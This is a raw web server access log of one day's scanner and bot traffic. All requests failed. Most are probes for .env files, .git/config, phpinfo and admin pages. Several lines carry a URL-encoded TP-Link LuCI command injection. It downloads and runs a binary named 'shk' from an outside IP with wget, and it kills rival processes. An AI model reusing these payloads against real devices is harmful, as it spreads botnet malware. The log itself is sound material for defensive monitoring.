103.203.56.1 - - [07/Jul/2024:04:42:40 +0000] "GET / HTTP/1.1" 404 122 "-" "Mozilla/5.0"
185.191.126.213 - - [07/Jul/2024:04:46:37 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
141.98.83.197 - - [07/Jul/2024:05:11:39 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
141.98.83.197 - - [07/Jul/2024:05:11:39 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F45.95.169.11%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60) HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
91.92.247.56 - - [07/Jul/2024:05:45:14 +0000] "GET /inc/.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [07/Jul/2024:06:18:00 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [07/Jul/2024:06:18:00 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
92.249.48.202 - - [07/Jul/2024:06:19:50 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
45.148.10.251 - - [07/Jul/2024:06:28:16 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
45.79.181.104 - - [07/Jul/2024:06:30:39 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03\x89\xCFV\xE8O\xF7xM\xE4\xAA\x94k\xACD0\xBA" 400 154 "-" "-"
54.37.79.75 - - [07/Jul/2024:06:36:25 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [07/Jul/2024:06:36:26 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.191.126.213 - - [07/Jul/2024:06:37:19 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
199.45.154.156 - - [07/Jul/2024:06:58:05 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
199.45.154.156 - - [07/Jul/2024:06:58:19 +0000] "GET / HTTP/1.1" 404 122 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
199.45.154.156 - - [07/Jul/2024:06:58:20 +0000] "PRI * HTTP/2.0" 400 154 "-" "-"
20.49.1.218 - - [07/Jul/2024:07:05:23 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.49.1.218 - - [07/Jul/2024:07:05:23 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
141.98.83.197 - - [07/Jul/2024:07:14:12 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
141.98.83.197 - - [07/Jul/2024:07:24:31 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.224.128.43 - - [07/Jul/2024:07:49:08 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
118.193.32.92 - - [07/Jul/2024:07:54:20 +0000] "\x16\x03\x01\x01\x17\x01\x00\x01\x13\x03\x03\xB6(e#\x08\xFA0\xBB\xA2n\x01\x1Dc\xC0\xA7\xC6\x01\x87\x09K\xAA\xF2\x86a\x97\xBF\xF9\x17M\xE5\x0C) \xDFW}\x1E\x16\xCF\xB2\xCCI4\x04\xB4PZm\x1A\x12a\x7F\xBB\x1FS!\x90\xC6g'M\xDE\xD3\x92\xC6\x004\xCC\xA8\xCC\xA9\xC0/\xC00\xC0+\xC0,\xC0\x09\x00\x9E\xCC\xA8\xCC\xAA\x003\x00=\x00\x16\xC0" 400 154 "-" "-"
118.193.32.92 - - [07/Jul/2024:07:54:30 +0000] "GET / HTTP/1.1" 404 552 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
118.193.32.92 - - [07/Jul/2024:07:54:48 +0000] "GET /favicon.ico HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
118.193.32.92 - - [07/Jul/2024:07:54:49 +0000] "GET /robots.txt HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
118.193.32.92 - - [07/Jul/2024:07:54:49 +0000] "GET /sitemap.xml HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
91.92.247.56 - - [07/Jul/2024:07:58:11 +0000] "GET /laravel/.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.148.10.251 - - [07/Jul/2024:08:08:07 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
40.86.176.117 - - [07/Jul/2024:08:21:09 +0000] "GET /portal/redlion HTTP/1.1" 404 122 "-" "Mozilla/5.0 zgrab/0.x"
54.37.79.75 - - [07/Jul/2024:08:36:05 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [07/Jul/2024:08:36:05 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.191.126.213 - - [07/Jul/2024:08:44:54 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
141.98.83.197 - - [07/Jul/2024:08:54:00 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
45.148.10.251 - - [07/Jul/2024:09:01:58 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
94.156.68.162 - - [07/Jul/2024:09:07:44 +0000] "GET /.env HTTP/1.1" 404 122 "-" "Opera/9.64 (X11; Linux i686; U; Linux Mint; nb) Presto/2.1.1"
94.156.68.162 - - [07/Jul/2024:09:07:55 +0000] "GET /.env HTTP/1.1" 404 122 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/7.0.5(0x17000523) NetType/4G Language/zh_CN"
51.254.59.113 - - [07/Jul/2024:09:30:19 +0000] "GET / HTTP/1.1" 404 552 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
94.156.65.37 - - [07/Jul/2024:09:39:00 +0000] "GET /.env HTTP/1.1" 404 122 "-" "python-requests/2.32.3"
94.156.65.37 - - [07/Jul/2024:09:39:00 +0000] "GET /?%3Cplay%3Ewithme%3C/%3E HTTP/1.1" 404 122 "-" "python-requests/2.32.3"
94.156.65.37 - - [07/Jul/2024:09:39:01 +0000] "POST / HTTP/1.1" 404 122 "-" "python-requests/2.32.3"
94.156.65.37 - - [07/Jul/2024:09:39:01 +0000] "POST / HTTP/1.1" 404 122 "-" "python-requests/2.32.3"
141.98.83.197 - - [07/Jul/2024:09:43:54 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.150.26.246 - - [07/Jul/2024:09:54:20 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
54.37.79.75 - - [07/Jul/2024:09:56:39 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [07/Jul/2024:09:56:39 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
170.64.222.122 - - [07/Jul/2024:10:29:17 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x037\xF0\xC4jl\xA5\xE6\xB8*\x0F5i\x01\xB1\xA5\xC5\xB6\x01\x13\x5C\xEF\xD3\xDB\x10q\xC7\xE8" 400 154 "-" "-"
170.64.222.122 - - [07/Jul/2024:10:29:17 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xFC\xAA\x85\xF5\xC1<-9\x09?\xAE\xAD\xAEK\xA6J\xA9\xCA\xC1\x00\x13\xED\x0Cd\xFF\xCD+K8|\xE9X\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
170.64.222.122 - - [07/Jul/2024:10:29:17 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
170.64.222.122 - - [07/Jul/2024:10:29:17 +0000] "GET /form.html HTTP/1.1" 404 122 "-" "curl/8.1.2"
170.64.222.122 - - [07/Jul/2024:10:29:18 +0000] "GET /upl.php HTTP/1.1" 404 122 "-" "Mozilla/5.0"
170.64.222.122 - - [07/Jul/2024:10:29:18 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xBA\xB8\xAA\x0F\x09O\xFC\x89\xFF\xCE\xC4\x91\x9D\x01| \xA9^\xBE\x01\xB8\xD5z\x1F\xC4\xDC\xC2\x0CL\x89)\xE0\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
170.64.222.122 - - [07/Jul/2024:10:29:18 +0000] "GET /geoip/ HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
170.64.222.122 - - [07/Jul/2024:10:29:19 +0000] "GET /favicon.ico HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
170.64.222.122 - - [07/Jul/2024:10:29:19 +0000] "GET /1.php HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
170.64.222.122 - - [07/Jul/2024:10:29:19 +0000] "GET /bundle.js HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
170.64.222.122 - - [07/Jul/2024:10:29:20 +0000] "GET /files/ HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
170.64.222.122 - - [07/Jul/2024:10:29:20 +0000] "GET /systembc/password.php HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
170.64.222.122 - - [07/Jul/2024:10:29:20 +0000] "GET /password.php HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
170.64.222.122 - - [07/Jul/2024:10:29:21 +0000] "GET /info.php HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
205.210.31.151 - - [07/Jul/2024:10:33:48 +0000] "GET / HTTP/1.1" 404 122 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
45.148.10.251 - - [07/Jul/2024:10:37:21 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
91.92.244.183 - - [07/Jul/2024:10:49:17 +0000] "GET /.git/config HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Linux; Android 8.0.0; moto e5 cruise Build/OCPS27.91-157-12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36"
54.37.79.75 - - [07/Jul/2024:11:03:09 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [07/Jul/2024:11:03:10 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.191.126.213 - - [07/Jul/2024:11:04:16 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
205.210.31.122 - - [07/Jul/2024:11:07:52 +0000] "GET / HTTP/1.1" 404 122 "-" "\x22Xpanse-bot"
104.197.69.115 - - [07/Jul/2024:11:08:56 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/117.0.5938.132 Safari/537.36"
34.72.176.129 - - [07/Jul/2024:11:09:02 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
185.246.189.18 - - [07/Jul/2024:11:09:47 +0000] "GET / HTTP/1.0" 404 150 "-" "ivre-masscan/1.3 https://github.com/robertdavidgraham/"
52.228.161.83 - - [07/Jul/2024:11:33:08 +0000] "MGLNDD_20.120.210.192_80" 400 154 "-" "-"
92.249.48.202 - - [07/Jul/2024:11:35:34 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
91.92.247.56 - - [07/Jul/2024:11:49:27 +0000] "GET /private/.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.62.197.221 - - [07/Jul/2024:11:52:27 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
64.62.197.216 - - [07/Jul/2024:11:53:47 +0000] "GET /webui/ HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
64.62.197.225 - - [07/Jul/2024:11:54:41 +0000] "GET /favicon.ico HTTP/1.1" 404 122 "-" "Mozilla/5.0 (iPad; CPU OS 15_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6,2 Mobile/15E148 Safari/604.1"
64.62.197.219 - - [07/Jul/2024:11:55:15 +0000] "GET /geoserver/web/ HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
45.33.80.243 - - [07/Jul/2024:12:05:01 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03" 400 154 "-" "-"
45.148.10.251 - - [07/Jul/2024:12:15:23 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.191.126.213 - - [07/Jul/2024:12:15:35 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
184.105.247.194 - - [07/Jul/2024:12:16:37 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xA7\xC9\xF3!\xF3f\xC6\xD3W\x1Cw+\xA6S\x91C\xAC\x07\xDD\xF9$X\x8E\x0E\xCBe\x8D\x14\x92\x0C\xE20\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
185.224.128.43 - - [07/Jul/2024:12:36:04 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
141.98.83.197 - - [07/Jul/2024:12:41:42 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
54.37.79.75 - - [07/Jul/2024:12:47:07 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [07/Jul/2024:12:47:07 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
194.165.16.72 - - [07/Jul/2024:13:12:20 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 154 "-" "-"
45.148.10.251 - - [07/Jul/2024:13:15:34 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
141.98.83.197 - - [07/Jul/2024:13:23:47 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
91.92.247.56 - - [07/Jul/2024:14:27:52 +0000] "GET /secure/.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.79.128.205 - - [07/Jul/2024:14:30:15 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03\xD8\x1F\x8C\x97&\xCD\x86\xC4o\xCDp\x12!\xBDB\x9A\x9E\xBA\x9A\x16Ib+|_\x12\xE5\xC7\xB2t\xE9\x89\x00\x00 \xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
44.225.174.208 - - [07/Jul/2024:15:05:07 +0000] "\x00\x00\x00P\x00\x03\x00\x00user\x00nuclei\x00database\x00nuclei\x00application_name\x00psql\x00client_encoding\x00UTF8\x00\x00p\x00\x00\x006SCRAM-SHA-256\x00\x00\x00\x00 n,,n=,r=\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" 400 154 "-" "-"
44.225.174.208 - - [07/Jul/2024:15:05:07 +0000] "GET / HTTP/1.1" 404 150 "-" "WizDynamicScanner/1.0"
44.236.133.133 - - [07/Jul/2024:15:05:08 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.126 Safari/537.36"
44.225.174.208 - - [07/Jul/2024:15:05:09 +0000] "GET /version HTTP/1.1" 404 122 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0"
103.86.126.130 - - [07/Jul/2024:15:13:58 +0000] "GET / HTTP/1.1" 404 552 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
185.191.126.213 - - [07/Jul/2024:15:34:43 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
4.255.100.243 - - [07/Jul/2024:15:48:57 +0000] "GET / HTTP/1.1" 404 122 "-" "Mozilla/5.0 zgrab/0.x"
84.54.51.43 - - [07/Jul/2024:15:57:25 +0000] "GET /.env HTTP/1.1" 404 552 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
141.98.83.197 - - [07/Jul/2024:16:01:12 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
141.98.83.197 - - [07/Jul/2024:16:01:12 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F45.95.169.11%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60) HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
206.168.34.193 - - [07/Jul/2024:16:24:09 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
206.168.34.193 - - [07/Jul/2024:16:24:19 +0000] "GET / HTTP/1.1" 404 122 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.193 - - [07/Jul/2024:16:24:19 +0000] "PRI * HTTP/2.0" 400 154 "-" "-"
91.92.247.56 - - [07/Jul/2024:16:33:03 +0000] "GET /assets/.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
46.174.191.31 - - [07/Jul/2024:17:04:55 +0000] "GET / HTTP/1.0" 404 150 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko"
92.249.48.202 - - [07/Jul/2024:17:10:36 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
94.156.66.39 - - [07/Jul/2024:17:24:22 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 122 "http://20.120.210.192:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.39 - - [07/Jul/2024:17:24:22 +0000] "" 400 0 "-" "-"
45.148.10.251 - - [07/Jul/2024:17:48:39 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
141.98.83.197 - - [07/Jul/2024:17:51:25 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
91.92.247.56 - - [07/Jul/2024:18:09:35 +0000] "GET /app/.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.23.166 - - [07/Jul/2024:18:20:24 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.23.166 - - [07/Jul/2024:18:20:24 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
205.210.31.182 - - [07/Jul/2024:18:40:45 +0000] "GET / HTTP/1.0" 404 150 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
185.224.128.43 - - [07/Jul/2024:18:46:12 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
141.98.83.197 - - [07/Jul/2024:19:20:07 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
91.92.247.56 - - [07/Jul/2024:19:46:17 +0000] "GET /public_html/.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
94.156.68.162 - - [07/Jul/2024:19:50:25 +0000] "GET /_profiler/phpinfo HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.113 Safari/537.36 Vivaldi/2.1.1337.51"
94.156.68.162 - - [07/Jul/2024:19:51:38 +0000] "GET /_profiler/phpinfo HTTP/1.1" 404 122 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.78.1 (KHTML like Gecko) Version/7.0.6 Safari/537.78.1"
